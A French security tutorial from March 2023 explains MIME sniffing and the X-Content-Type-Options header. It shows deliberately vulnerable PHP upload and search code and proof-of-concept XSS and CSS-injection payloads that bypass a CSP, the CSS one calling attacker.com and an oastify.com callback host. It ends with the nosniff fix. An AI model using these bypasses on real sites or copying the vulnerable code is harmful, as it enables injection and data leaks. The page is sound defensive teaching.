---
description: 17 Mars 2023
---

# Fonctionnement de l'entête X-Content-Type-Options - Contournement de CSP

L'entête X-Content-Type-Options est un incontournable des résultats de scan des outils automatisés. Mais à quoi sert-il réellement et contre quoi protège-t-il ?

## Le type MIME

Le type MIME (Multipurpose Internet Mail Extensions) est un identifiant en deux parties, un type et un sous-type, qui peut également posséder des options. Il permet de spécifier le type de contenu échangé, par exemple une image, une vidéo, un document audio ou encore un simple texte.

La syntaxe est la suivante :&#x20;

```
type/sous-type; options
```

dont voici quelques exemples :&#x20;

```
text/plain
text/html
image/png
application/octet-stream
application/json; charset=utf-8
```

Le type MIME `application/octet-stream` est la valeur par défaut pour un fichier binaire. Un fichier ayant ce type MIME ne sera pas exécuté au sein du navigateur, mais plutôt proposé en téléchargement. Le type MIME `text/plain` est la valeur par défaut pour les fichiers texte. En général, un navigateur tentera d'afficher un tel fichier.

Bien qu'il puisse sembler non problématique de déterminer le type d'un fichier en fonction de son extension, cette dernière n'est pas fiable : l'utilisateur peut s'être trompé en la renseignant par exemple. En général, un navigateur va plutôt se reposer sur le type MIME afin de déterminer la nature d'un fichier. En raison de ce mécanisme, il est nécessaire que le serveur fournissant la ressource renseigne correctement cette information grâce à l'entête HTTP `Content-Type`. Si cet entête n'est pas correctement renseigné voir absent, alors le navigateur va tenter de déterminer lui même la nature du fichier en analysant son contenu : c'est ce qu'on nomme le MIME Sniffing. Bien que ce mécanisme possède des avantages elle amène aussi certaines vulnérabilités.

{% hint style="info" %}
Le MIME Sniffing est présent sur tous les navigateurs mais il était encore plus agressif sur les versions Internet Explorer.
{% endhint %}

## Contournement de politiques CSP avec upload de fichiers

### Présentation de l'application vulnérable

L'application suivante permet à l'utilisateur d'uploader des fichiers sur un serveur distant et également d'effectuer une recherche par mot-clé pour retrouver plus facilement ses documents :&#x20;

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

L'utilisateur peut rechercher un document de la façon suivante :&#x20;

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Voici le code source associé :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```php
<h1>Ne perdez plus jamais vos documents</h1>
<form action="./" method="GET">
  <input type="text" name="search" placeholder="Recherche par mot clé">
  <input type="submit" value="Rechercher">
 </form>
 
 <?php 
   if(isset($_GET['search']) && !empty($_GET['search'])) {
     $search = $_GET['search'];
     
     /* On force à 0 car ce n'est pas le but d'avoir une app fonctionnelle :p */
     echo "Il y a 0 résultat(s) pour votre recherche \"" . $search . "\" :";
   }      
 ?>
```
{% endcode %}

Le développeur étant sensibilisé aux vulnérabilités Cross-Site Scripting il décide de se protéger de manière stricte en utilisant les directives Content-Security-Policy (CSP) suivantes :&#x20;

{% code overflow="wrap" %}
```csp
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src *; style-src 'self' ; font-src 'self'; frame-ancestors 'none'; object-src 'none';
```
{% endcode %}

Le développeur valide également la directive avec l'[outil d'évaluation de Google](https://csp-evaluator.withgoogle.com/) :&#x20;

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

L'application proposant en effet la possibilité de déposer des fichiers, il décide de durcir son formulaire d'upload :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```php
// Vérification de la taille du fichier
if ($_FILES['file']['size'] > 1000000) {
  die('Le fichier est trop volumineux.');
}

// Vérification du type du fichier
// On autorise seulement les images ainsi que les fichiers type texte
$allowed_types = ['image/jpeg', 'image/png', 'image/gif', 'text/plain'];

// On interdit certaines extensions malicieuses
$forbidden_extensions = ['php', 'exe', 'js', 'css'];

$finfo = new finfo(FILEINFO_MIME_TYPE);
$file_type = $finfo->file($_FILES['file']['tmp_name']);
if (!in_array($file_type, $allowed_types)) {
  die('Le type de fichier n\'est pas autorisé.');
}

// Vérification de l'extension de fichier
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (in_array($file_extension, $forbidden_extensions)) {
  die('L\'extension de fichier est interdite.');
}
```
{% endcode %}

### Exploitation de la vulnérabilité

#### Exploitation d'une Injection Cross-Site Scripting (XSS)

Un utilisateur malicieux découvre la possibilité d'une XSS au niveau du paramètre de recherche `search` mais CSP semble protéger correctement son exécution :&#x20;

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

L'attaquant tente alors d'uploader un fichier de type Javascript `xss.js` puis de l'appeler directement via la paramètre `src` de la balise `<script></script>` :

{% code title="xss.js" overflow="wrap" lineNumbers="true" %}
```javascript
alert("XSS dans fichier uploadé");
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

Mais le durcissement de la fonctionnalité par le développeur l'en empêche :&#x20;

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

L'attaquant ayant déjà réussi à uploader avec succès un fichier texte simple, il effectue à nouveau son attaque mais en intégrant la payload XSS dans un fichier ayant l'extension `txt` :&#x20;

{% code title="xss.txt" overflow="wrap" lineNumbers="true" %}
```javascript
alert("XSS dans fichier uploadé");
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Et référence le fichier précédemment uploadé :&#x20;

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Le fichier étant bien hébergé sur le même domaine d'exécution, la politique CSP n'est pas déclenchée et la payload XSS est exécutée :&#x20;

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Et cela, bien que le `Content-Type` retourné par le serveur ne soit pas de type `text/javascript` mais bien `text/plain` :&#x20;

{% code overflow="wrap" %}
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 35
Connection: close
Accept-Ranges: bytes

alert("XSS dans fichier uploadé");
```
{% endcode %}

Il peut arriver que le serveur, suivant sa configuration, retourne un Content-Type de type `application/octet-stream`. Si tel est le cas, l'attaque reste fonctionnelle :&#x20;

{% code overflow="wrap" %}
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 35
Connection: close
Accept-Ranges: bytes

alert("XSS dans fichier uploadé avec un content-type application/octet-stream");
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

En revanche, faire passer un fichier Javascript pour une image ne fonctionnera pas :&#x20;

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

#### Exploitation d'une Injection Cascading Style Sheets (CSS)

Le développeur, étant maintenant au courant de la vulnérabilité permettant d'exploiter l'injection XSS a décidé de bannir complètement l'utilisation de Javascript. La politique CSP devient alors la suivante :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```csp
Content-Security-Policy: default-src 'self'; script-src 'none'; img-src *; style-src 'self' ; font-src 'self'; frame-ancestors 'none'; object-src 'none';
```
{% endcode %}

L'outil de test de Google confirme la bonne protection concernant l'exécution de script :&#x20;

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Et l'injection ne semble en effet plus possible :&#x20;

<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

Comme déjà évoqué dans plusieurs articles, l'injection CSS peut permettre de récupérer des informations grâce à l'utilisation des [sélecteurs](../../2022/novembre/les-injections-css-attribute-selector.md), par exemple. L'injection va se faire grâce à la balise `<link>` . L'attaquant va devoir uploader un fichier CSS qui aura une extension autre que `css`, car interdite par l'application :

{% code title="css.txt" overflow="wrap" lineNumbers="true" %}
```css
input {
  background-image:url(http://attacker.com/);
}
```
{% endcode %}

{% hint style="info" %}
Il s'agit juste d'une preuve de concept, une seule requête vers l'URL de l'attaquant suffira donc ici afin de prouver son bon fonctionnement.&#x20;
{% endhint %}

Bien que le `Content-Type` retourné par le serveur soit `text/plain` et non `text/css` comme attendu :&#x20;

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 107
pConnection: close
Accept-Ranges: bytes

input {
  background-image:url(http://z1162jdi8otoae191lpbq0o2ctik6auz.oastify.com/poc-x-content-type);
}
```

Le navigateur exécute tout de même le code malicieux :

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Cette attaque n'est possible seulement parce que la CSP permet le chargement d'image distante. Dans le cas contraire, l'impact de cette injection sera sans doute réduite.
{% endhint %}

Ici l'attaque fonctionnera également dans le cas où le serveur renvoie un `Content-Type` de type `application/octet-stream`. Et plus intéressant, l'attaque fonctionnera même si le Content-Type retourné par le serveur n'est pas exécutable par exemple avec `image/jpeg` :&#x20;

{% code overflow="wrap" %}
```http
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Length: 107
Connection: close
tpAccept-Ranges: bytes

input {
  background-image:url(http://z1162jdi8otoae191lpbq0o2ctik6auz.oastify.com/poc-x-content-type);
}
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## L'entête X-Content-Type-Options

X-Content-Type-Options est un entête HTTP de sécurité qui peut être présent dans les réponses HTTP et qui indique au navigateur de suivre et ne de pas modifier les type MIME indiqués dans l'entête `Content-Type`. Cela permet de se protéger contre les vulnérabilités liées au MIME sniffing. L'entête est supporté par tous les navigateurs principaux :&#x20;

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

### Syntaxe

La syntaxe de l'entête est la suivante : &#x20;

{% code overflow="wrap" %}
```http
X-Content-Type-Options: nosniff
```
{% endcode %}

### Directives

`nosniff`

Bloque une requête si la destination de la requête est :

* "`style`" et le MIME n'est pas de type `text/css`
* "`script`" et le MIME n'est pas de type JavaScript MIME type (dont `text/javascript` par exemple)

### Protection de l'application

Le développeur ayant maintenant connaissance de cet entête de sécurité, il décide d'appliquer cette bonne pratique et modifie la configuration de son serveur en conséquence. Par exemple pour Nginx :&#x20;

{% code title="Fichier de configuration Nginx" overflow="wrap" lineNumbers="true" %}
```nginx
add_header X-Content-Type-Options "nosniff";
```
{% endcode %}

L'attaquant tente à nouveau d'exploiter la vulnérabilité afin d'exécuter une XSS, mais cette fois le navigateur refuse de charger le fichier contenant le script malicieux :&#x20;

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

La réponse du serveur contenant effet l'entête de protection :&#x20;

{% code overflow="wrap" %}
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 35
Connection: close
X-Content-Type-Options: nosniff
Accept-Ranges: bytes

alert("XSS dans fichier uploadé");
```
{% endcode %}



Il en va de même pour l'injection CSS :&#x20;

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 107
Connection: close
X-Content-Type-Options: nosniff
Accept-Ranges: bytes

input {
  background-image:url(http://z1162jdi8otoae191lpbq0o2ctik6auz.oastify.com/poc-x-content-type);
}
```
{% endcode %}

## Références

* [https://developer.mozilla.org/fr/docs/Web/HTTP/Basics\_of\_HTTP/MIME\_types](https://developer.mozilla.org/fr/docs/Web/HTTP/Basics\_of\_HTTP/MIME\_types)
* [https://fetch.spec.whatwg.org/#x-content-type-options-header](https://fetch.spec.whatwg.org/#x-content-type-options-header)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)
* [https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941\(v=vs.85\))
* [https://siwecos.de/wiki/X-Content-Type-Options-Vulnerability/EN](https://siwecos.de/wiki/X-Content-Type-Options-Vulnerability/EN)
* [https://wanago.io/2022/03/14/mime-sniffing-x-content-type-options-content-type/](https://wanago.io/2022/03/14/mime-sniffing-x-content-type-options-content-type/)
